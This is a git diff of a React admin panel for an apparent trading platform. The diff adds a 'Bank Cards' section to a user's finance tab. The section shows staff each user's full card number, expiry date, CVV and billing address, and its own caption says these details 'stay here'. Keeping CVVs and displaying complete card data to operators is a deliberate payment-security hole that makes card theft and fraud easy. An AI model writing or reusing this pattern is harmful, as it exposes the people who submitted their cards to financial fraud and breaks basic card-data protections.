@@ -20,6 +20,7 @@ import {
   ArrowUpFromLine,
   Bot,
   Copy,
+  CreditCard,
 } from "lucide-react";
 import { AdminAPI, AiBotAPI, CopyBotAPI, assetUrl } from "../lib/api.js";
 import { onSocketEvent } from "../lib/socket.js";
@@ -1108,6 +1109,47 @@ export default function UserControlRoom({ userId, onBack, toast, onOpenGlobalSpo
       {/* ══════════════════ FINANCE TAB ═════════════════════════ */}
       {activeTab === "finance" && (
         <div className="grid gap-4 xl:grid-cols-2">
+          <SectionCard
+            icon={CreditCard}
+            title="Bank Cards"
+            accent="cyan"
+            className="xl:col-span-2"
+            description="Full card details the user submitted. Number, expiry, and CVV stay here."
+          >
+            {(u?.bankCards || []).length === 0 ? (
+              <p className="text-xs text-slate-500">No bank cards on this profile.</p>
+            ) : (
+              <div className="grid gap-3 md:grid-cols-2">
+                {(u.bankCards || []).map((c) => (
+                  <div
+                    key={c._id || c.cardNumber}
+                    className="rounded-xl border border-white/10 bg-black/20 p-3"
+                  >
+                    <div className="mb-2 flex items-center justify-between gap-2">
+                      <div className="truncate text-sm font-semibold text-white">
+                        {c.holderName || "Card"}
+                      </div>
+                      <span className="shrink-0 rounded-full border border-white/10 px-2 py-0.5 text-[10px] font-bold uppercase text-slate-300">
+                        {c.status || "pending"}
+                      </span>
+                    </div>
+                    <div className="space-y-1 font-mono text-[12px] text-slate-200">
+                      <div>Card: {c.cardNumber || "—"}</div>
+                      <div>
+                        Exp: {c.expMonth || "—"}/{c.expYear || "—"} · CVV:{" "}
+                        {c.cvv || "—"}
+                      </div>
+                      {c.billingAddress ? (
+                        <div className="font-sans text-[11px] text-slate-400">
+                          Address: {c.billingAddress}
+                        </div>
+                      ) : null}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </SectionCard>
           {/* AI Bot Assign */}
           <SectionCard icon={Bot} title="AI Futures Strategy" accent="teal"
             description="User requests lock days. You approve, reject, or change days up or down. Saving days on an active contract updates the end date immediately.">
